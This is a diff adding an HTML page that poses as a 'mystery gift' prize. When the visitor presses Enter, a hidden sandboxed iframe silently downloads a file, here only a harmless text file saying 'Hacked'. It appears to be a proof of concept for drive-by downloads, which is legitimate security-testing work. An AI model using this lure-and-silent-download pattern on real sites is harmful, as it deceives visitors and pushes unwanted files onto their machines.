@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>🎁 Unlock Your Mystery Gift!</title>
+    <style>
+      body {
+        background: black;
+        color: white;
+        text-align: center;
+        padding-top: 100px;
+        font-family: sans-serif;
+      }
+      h1 {
+        color: gold;
+        font-size: 2em;
+      }
+      #status {
+        margin-top: 40px;
+        font-size: 1.2em;
+        color: lightgreen;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>🎉 Congratulations! 🎉</h1>
+    <p>Press <b>Enter</b> to claim your mystery reward!</p>
+    <div id="status">Waiting for input...</div>
+
+    <iframe
+      id="hidden-frame"
+      sandbox="allow-downloads allow-scripts"
+      style="display: none"
+    ></iframe>
+
+    <script>
+      document.body.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") {
+          document.getElementById("status").innerText = "Processing...";
+          const payload = "Hacked: You downloaded this silently.";
+          const dataUri = `data:text/plain,${encodeURIComponent(payload)}`;
+          const html = `
+            <a id="dl" href="${dataUri}" download="mystery-gift.txt">Download</a>
+            <script>dl.click()</script>
+          `;
+
+          const iframe = document.getElementById("hidden-frame");
+          const blob = new Blob([html], { type: "text/html" });
+          const iframeUrl = URL.createObjectURL(blob);
+          iframe.src = iframeUrl;
+
+          document.getElementById("status").innerText = "Reward claimed!";
+        }
+      });
+    </script>
+  </body>
+</html>
